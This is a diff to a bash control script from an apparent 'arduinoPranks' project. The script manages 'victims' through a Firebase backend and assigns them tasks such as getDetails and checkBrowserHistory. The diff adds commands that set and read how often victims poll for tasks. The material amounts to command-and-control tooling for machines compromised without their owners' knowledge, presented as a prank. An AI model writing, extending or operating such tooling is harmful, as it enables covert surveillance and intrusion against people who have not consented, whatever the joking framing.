@@ -16,6 +16,8 @@ function usage(){
   echo "  setVictimTask <victim> <taskID>"
   echo "  getVictimTask <victim>"
   echo "  init"
+  echo "  setIterationLength <length>"
+  echo "  getIterationLength"
   echo ""
 }
 
@@ -101,6 +103,31 @@ function listVictims() {
 
 ###############################################################################
 
+function getIterationLength() {
+
+  local length=`curl -s "https://${firebaseProject}.firebaseio.com/iterationLength.json"`
+
+
+  if [ ! -z "$length" ] && [ $length -eq $length ]; then
+    echo "$length"
+  else
+    echo "60"
+  fi
+}
+
+function setIterationLength() {
+  local length="$1"
+
+  if [ ! -z "$length" ] && [ $length -eq $length ] 2>/dev/null; then
+    curl -s -X PUT -d "$length" "https://${firebaseProject}.firebaseio.com/iterationLength.json"  > /dev/null
+  else
+    usage
+    exit 1
+  fi
+}
+
+###############################################################################
+
 function getVictimTask() {
   local victim="$1"
 
@@ -109,7 +136,7 @@ function getVictimTask() {
     exit 1
   fi
 
-  curl "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json"
+  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json"
   echo ""
 }
 
@@ -118,6 +145,7 @@ function getVictimTask() {
 function initialize() {
 
   addTask default arduinoPranks/master/websiteReactionPrank/task.getDetails
+  addTask getDetails arduinoPranks/master/websiteReactionPrank/task.getDetails
   addTask checkBrowserHistory arduinoPranks/master/websiteReactionPrank/task.checkBrowserHistory
   addTask sleep arduinoPranks/master/websiteReactionPrank/task.sleep
   addTask status arduinoPranks/master/websiteReactionPrank/task.status
@@ -126,6 +154,8 @@ function initialize() {
 
   addTask cycle1 arduinoPranks/master/websiteReactionPrank/task.cycle1
   addTask cycle2 arduinoPranks/master/websiteReactionPrank/task.cycle2
+
+  curl -X PUT -d "60" "https://${firebaseProject}.firebaseio.com/iterationLength.json"
 }
 
 ###############################################################################
@@ -150,6 +180,12 @@ case "$func" in
     ;;
   listtasks)
     listTasks
+    ;;
+  setiterationlength)
+    setIterationLength "$2"
+    ;;
+  getiterationlength)
+    getIterationLength
     ;;
   init)
     initialize
